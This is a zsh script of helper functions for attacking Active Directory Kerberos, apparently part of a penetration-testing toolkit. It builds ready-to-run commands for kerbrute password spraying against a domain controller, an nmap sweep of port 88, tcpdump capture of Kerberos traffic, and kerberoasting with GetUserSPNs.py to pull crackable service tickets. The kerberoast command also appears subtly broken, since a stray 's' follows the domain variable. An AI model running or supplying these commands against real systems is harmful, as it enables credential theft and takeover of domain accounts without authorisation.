#!/usr/bin/env zsh

############################################################# 
# nb-ad-kerb
#############################################################
nb-ad-kerb-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-kerb
------------
The nb-ad-kerb namespace contains commands for scanning and enumerating kerberos records and servers.

Commands
--------
nb-ad-kerb-install        installs dependencies
nb-ad-kerb-nmap-sweep     scan a network for services
nb-ad-kerb-tcpdump        capture traffic to and from a host
nb-ad-kerb-pass-spray     perform password spraying
nb-ad-kerb-kerberoast     get SPN for a service account

DOC
}

nb-ad-kerb-pass-spray() {
    __check-project
    nb-vars-set-domain

	  __ask "Enter the IP address of the target DC server"
    local dc && __askvar dc DC_IP

    __ask "Select a user list"
    __askpath ul FILE $HOME/desktop/projects/

	  __ask "Enter the password for spraying"
    local pw && __askvar pw PASSWORD

    print -z "kerbrute passwordspray -d ${__DOMAIN} --dc $dc $ul $pw -o $(__netadpath)/kerbrute-password-spray.txt"
}

nb-ad-kerb-install() {
    __info "Running $0..."
    __pkgs tcpdump nmap impacket
}

nb-ad-kerb-nmap-sweep() {
    __check-project
    nb-vars-set-network
    print -z "sudo nmap -n -Pn -sS -p88 ${__NETWORK} -oA $(__netadpath)/kerb-sweep"
}

nb-ad-kerb-tcpdump() {
    __check-project
    nb-vars-set-iface
    nb-vars-set-rhost
    print -z "sudo tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 88 -w $(__netadpath)/kerb.pcap"
}

nb-ad-kerb-kerberoast() {
    __ask "Enter target AD domain (must also be set in your hosts file)"
    nb-vars-set-domain
    __ask "Enter service user account"
    __check-user
    __ask "Enter the IP address of the target domain controller"
    nb-vars-set-rhost
    print -z "GetUserSPNs.py -request ${__DOMAIN}s/${__USER} -dc-ip ${__RHOST} | tee $(__domadpath)/kerberoast.txt"
}
